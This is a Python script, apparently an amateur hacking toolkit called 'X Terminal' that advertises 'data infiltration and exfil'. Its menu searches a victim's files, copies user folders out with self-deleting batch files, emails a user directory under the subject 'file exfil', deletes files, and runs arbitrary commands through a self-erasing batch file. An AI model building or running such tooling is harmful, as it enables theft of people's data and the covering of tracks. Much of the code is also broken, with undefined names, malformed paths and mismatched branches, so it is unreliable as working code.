import hashlib
import random
import os
import urllib.request
import subprocess
import time
import os.path
import getpass
import yagmail

getpass. getuser()
print("setting up X terminal")
time.sleep(2)
print("checking if setup file exists")
time.sleep(2)
url = 'http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg'
urllib.request.urlretrieve(url, "/Users/joemc/Downloads/cat.jpg")
chk=os.path.isfile("/Users/joemc/Downloads/cat.jpg")
if chk==True:
    clear = lambda: os.system('cls')
    time.sleep(0.5)
    clear()
    time.sleep(0.5)
    getpass. getuser  

    print((("""
    ____  ___ ___________                  .__              .__   
    \   \/  / \__    ___/__________  _____ |__| ____ _____  |  |  
     \     /    |    |_/ __ \_  __ \/     \|  |/    \\__  \ |  |  
     /     \    |    |\  ___/|  | \/  Y Y  \  |   |  \/ __ \|  |__
    /___/\  \   |____| \___  >__|  |__|_|  /__|___|  (____  /____/ V1.2
          \_/              \/            \/        \/     \/ 
    making data infiltration and exfil easy as easy as picking a tubular lock

    1.search for certain files(name/extention)                               8.create a one use batch file.
    2.download files directly from the browser
    3.copy files to a flash drive
    4.copy and send files over email.
    5.delete files/directories (options 3 and 4 do this when complete)
    6.clear trash folder (options 3 and 4 do this when complete)
    7.encrypt files
    """)))
    tool_slct = input ("select tool: [1/2/3/4/5/6/7/8] : ")
    
    if tool_slct == "1":
        search_type = input ("select search type: [name/extention] : ")
        if search_type==("name"):
            name=input("file name ")
            dir_path = os.path.dirname(os.path.realpath(__file__))
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    if file.startswith(name):
                        print ("root"+'/'+str(file))
                    else:
                        print("no files found")
                    
                
    elif search_type==("extention"):
        extention=(".") + input("file type ")
        dir_path = os.path.dirname(os.path.realpath(__file__))
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                if file.endswith(extention):
                    print ("root"+'/'+str(file))
                else:
                    print("no files found")
            

    elif tool_slct == "2":
        url = input('url of download')
        path1="Users"
        print ("/"+path1)
        path2=getpass.getuser
        print ("/"+path1+"/"+path2)
        path3=input("enter third part of path ")
        print ("/"+path1+"/"+path2+"/"+path3)
        name1=input("enter name of file ")
        fullurl=("/"+path1+"/"+path2+"/"+path3+"/"+name1)
        print (fullurl)
        urllib.request.urlretrieve(url, fullurl)
        print('Beginning file download with urllib2...')
        print("file download sucessful")
        
    elif tool_slct=="3":
        getpass. getuser()
        fullname="robo.bat"
        fol_trnsfr=input("folder to transfer from ")
        drive_nme=input("name of drive ")
        file_trnsfr=input("files you want to transfer ")
        com_path=(r"C:\Users\""+getpass. getuser()+fol_trnsfr+ r"C:\Users\""+getpass. getuser()+fol_to)
        command=(com_path+file_trnsfr + '/s')
        f= open(fullname,"w+")
        f.write(((command+"""

@ECHO OFF
SETLOCAL

SET someOtherProgram=SomeOtherProgram.exe
TASKKILL /IM "%someOtherProgram%"
DEL "%~f0""")))
        f.close()
        subprocess.call([r'robo.bat'])
        print("starting transfer")
        time.sleep(2)
        print("transfer complete")
        

    elif tool_slct=="4":
        getpass. getuser()
        fullname="robo.bat"
        file_trnsfr=("C/Users/"+getpass. getuser())
        com_path=(r"C:\Users\""+getpass. getuser()+ r"C:\Users\"")
        command=(com_path+file_trnsfr + '/s /mir')
        f= open(fullname,"w+")
        f.write(((command+"""

@ECHO OFF
SETLOCAL

SET someOtherProgram=SomeOtherProgram.exe
TASKKILL /IM "%someOtherProgram%"
DEL "%~f0""")))
        f.close()
        subprocess.call([r'robo.bat'])
        
        receiver = input("your@gmail.com ")
        body = "Hello there from Yagmail"
        filename = "C:/Users/"
        yag = yagmail.SMTP(receiver)
        yag.send(
            to=receiver,
            subject="file exfil",
            contents=body,
            attachments=filename,
            )
        
    
        

    elif tool_slct=="5":
        delete_type = input("select file or dir to delete [1/2] ")
        if delete_type=="1":
            path1="Users"
            print ("/"+path1)
            path2=(getpass.getuser)
            print ("/"+path1+"/"+path2)
            path3=input("enter third part of path ")
            print ("/"+path1+"/"+path2+"/"+path3)
            name1=input("enter name of file ")
            fullurl=("/"+path1+"/"+path2+"/"+path3+"/"+name1)
            print (fullurl)
            if os.path.exists(fullurl):
                os.remove(fullurl)
            else:
                print("The file does not exist")
        elif delete_type=="2":
            path1=input("enter first part of path ")
            path2=user
            path3=input("enter third part of path ")
            name1=input("enter name of file ")
            fullurl=("/"+path1+"/"+path2+"/"+path3+"/"+name1)
            if os.path.exists(fullurl):
                shutil.rmtree(fullurl)

    elif tool_slct=="6":
        bin_path="C:/$Recycle.Bin"
        print(bin_path)
        
        
    elif tool_slct=="7":
        print("coming soon")

    elif tool_slct=="8":
        fullname="oneuse.bat"
        command=input("command u want run ")
        f= open(fullname,"w+")
        f.write(((command+"""
@ECHO OFF
SETLOCAL

SET someOtherProgram=SomeOtherProgram.exe
TASKKILL /IM "%someOtherProgram%"
DEL "%~f0""")))
        f.close()
        subprocess.call([r'oneuse.bat'])
        
elif chk==False:
    print("poop")
